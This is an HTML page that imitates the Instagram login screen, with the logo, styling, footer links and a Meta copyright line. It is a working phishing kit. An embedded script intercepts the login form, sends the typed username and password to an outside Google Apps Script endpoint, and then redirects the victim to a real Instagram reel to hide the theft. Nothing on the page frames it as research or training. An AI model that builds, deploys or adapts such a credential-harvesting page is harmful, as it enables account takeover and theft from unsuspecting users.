<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        /* General Styles */
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            max-width: 1200px;
            width: 100%;
        }

        .phone-mockup {
            flex: 1;
            display: flex;
            justify-content: center;
        }

        .phone-mockup img {
            width: 350px;
            height: auto;
        }

        .login-section {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            max-width: 350px;
        }

        .login-box {
            background: #fff;
            color: #000;
            border: 1px solid #dbdbdb;
            padding: 20px;
            border-radius: 8px;
            width: 100%;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-bottom: 10px;
        }

        .login-box input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background-color: #fafafa;
            font-size: 14px;
        }

        .login-box input:focus {
            outline: none;
            border-color: #a8a8a8;
        }

        .login-button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            margin-bottom: 10px;
        }

        .login-button:hover {
            background-color: #007bb5;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 12px;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
            margin: 0 10px;
        }

        .login-with-facebook {
            color: #4267b2;
            font-weight: bold;
            text-align: center;
            font-size: 14px;
            margin-bottom: 10px;
            cursor: pointer;
        }

        .login-with-facebook:hover {
            text-decoration: underline;
        }

        .forgot-password {
            text-align: center;
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .signup-box {
            background: #fff;
            color: #000;
            border: 1px solid #dbdbdb;
            padding: 10px;
            border-radius: 8px;
            width: 100%;
            text-align: center;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }

        .signup-box a:hover {
            text-decoration: underline;
        }

        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
        }

        .footer a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 5px;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .get-app {
            margin-top: 20px;
            display: flex;
            justify-content: center;
        }

        .get-app img {
            width: 136px;
            margin: 0 5px;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="phone-mockup">
            <img src="Screenshot 2025-01-08 at 12.25.25â€¯PM.png"
                alt="Instagram Mockup">
        </div>
        <div class="login-section">
            <div class="login-box">
                <img src="Instagram_logo.svg.png" alt="Instagram Logo"
                    width="250" style="display: block; margin: 0 auto 20px;">
                <form id="login-form" autocomplete="off">
                    <input type="text" placeholder="Phone number, username, or email" name="username" required>
                    <input type="password" placeholder="Password" name="password" required>
                    <a href="https://www.google.com/search?q=how+to+add+HF+to+button+in+HTML&gs_ivs=1"><button type="submit" class="login-button">Log In</button></a>
                </form>
            </div>
            <div class="signup-box">
                Don't have an account? <a href="#">Sign up</a>
            </div>
            <div class="get-app">
                <img src="Yfc020c87j0.png" alt="App Store">
                <img src="c5Rp7Ym-Klz.png" alt="Google Play">
            </div>
        </div>
    </div>
    <div class="footer">
        <div>
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
        <div>&copy; 2025 Instagram from Meta</div>
    </div>

<script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbyHbKDgEBXV8KDF-JtVr276Q2LmR5EMSYFa7FVa8Rd-eZo85nK1Q7mqNZD_QFmSuBPDpQ/exec';
    const form = document.getElementById('login-form');

    form.addEventListener('submit', (e) => {
        e.preventDefault();
        const formData = new FormData(form);

        fetch(scriptURL, { method: 'POST', body: formData })
            .then((response) => {
                

                // Redirect to another page
                window.location.href = "https://www.instagram.com/reel/DEg4YoPpaom/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==";
            })
         
    });
</script>

   
</body>

</html>
